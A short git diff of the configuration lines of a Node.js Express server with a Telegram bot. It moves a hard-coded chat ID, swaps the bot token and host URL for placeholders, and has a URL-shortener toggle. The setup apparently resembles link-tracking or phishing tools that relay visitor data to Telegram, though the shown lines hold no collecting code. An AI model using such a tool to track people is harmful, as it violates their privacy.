@@ -1,12 +1,13 @@
 const fs = require("fs");
 const express = require("express");
 var cors = require('cors');
+var targetChatId = '826978407';
+var nuid = 'dod0mf';
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-var targetChatId = '826978407';
-var nuid = 'dod0mf';
-const bot = new TelegramBot(process.env["bot"], { polling: true });
+TOKEN = 'YOUR API TOKEN';
+const bot = new TelegramBot(TOKEN, { polling: true });
 var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
 var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
 const app = express();
@@ -16,10 +17,9 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL = "https://your_url.com";
+var hostURL = "YOUR HOST URL HERE";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt = false;
-
 
 
 app.get("/w/:path/:uri", (req, res) => {
